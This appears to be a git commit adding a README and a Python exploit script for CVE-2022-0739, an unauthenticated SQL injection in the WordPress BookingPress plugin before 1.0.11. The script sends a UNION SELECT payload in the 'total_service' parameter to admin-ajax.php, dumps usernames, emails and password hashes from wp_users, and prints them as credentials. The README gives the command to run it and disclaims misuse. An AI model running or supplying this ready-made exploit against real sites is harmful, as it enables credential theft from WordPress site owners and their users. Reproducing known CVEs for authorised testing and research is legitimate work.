5858cb136bcbf25b71b67d1c6a896ca5a59e9303
Adrian <hadrian3689@gmail.com>
2022-12-12 23:12:53 -0500

    First commit with working exploit

---
+++ README.md
@@ -0,0 +1,22 @@
+# CVE-2022-0739
+
+CVE-2022-0739 Wordpress BookingPress Plugin < 1.0.11 Unauthenticated SQL Injection
+
+## Getting Started
+
+### Executing program
+
+* With python3
+```
+python3 sqli.py -u 'http://wordpress.site' -p 'wpnonce_value'
+```
+
+## Help
+
+For help menu:
+```
+python3 sqli.py -h
+```
+
+## Disclaimer
+All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.
---
+++ sqli.py
@@ -0,0 +1,49 @@
+import argparse
+import requests
+
+class SQL_Injection():
+    def __init__(self,url,wpnonce):
+        self.url = url + "/wp-admin/admin-ajax.php"
+        self.wpnonce = wpnonce
+        self.payload = self.sqlinjection()
+        self.extract()
+
+    def sqlinjection(self):
+        post_data = {
+                "action":"bookingpress_front_get_category_services",
+                "_wpnonce":self.wpnonce,
+                "category_id":"33",
+                "total_service":"-7502) UNION SELECT user_login,user_email,user_pass,null,5,6,7,8,9 from wp_users-- -"
+        }
+        payload = requests.post(self.url, data=post_data)
+        return payload.text
+    
+    def extract(self):
+        print("\nCredentials are:")
+        print("-"*50)
+        first_replace = self.payload.replace('[{"','')
+        second_replace = first_replace.replace('"},{"','":"')
+        third_replace = second_replace.replace('","','":"')
+        fourth_replace = third_replace.replace("}]","")
+        generate_list = fourth_replace.split('":"') 
+        for each_entry in range(0,len(generate_list)):
+            if generate_list[each_entry] == "bookingpress_service_id":
+                print("Username:",generate_list[each_entry+1])
+            if generate_list[each_entry] == "bookingpress_category_id":
+                print("Email:",generate_list[each_entry+1])
+            if generate_list[each_entry] == "bookingpress_service_name":
+                print("Password:",generate_list[each_entry+1])
+                print("-"*50)
+
+if __name__=="__main__":
+    parser = argparse.ArgumentParser(description="CVE-2022-0739 Wordpress BookingPress Plugin < 1.0.11 Unauthenticated SQL Injection")
+    print("CVE-2022-0739 WordPress BookingPress Plugin< 1.0.11 Unauthenticated SQL Injection")
+    parser.add_argument("-u",metavar="URL", help="Example: -u http://wordress.site/", required=True)
+    parser.add_argument("-p",metavar="WP Nonce", help="Example: -p 1a23b45c67d8", required=True) 
+    args = parser.parse_args()
+
+    try:
+        SQL_Injection(args.u,args.p)
+    except KeyboardInterrupt:
+        print("\nBye Bye!")
+        exit()
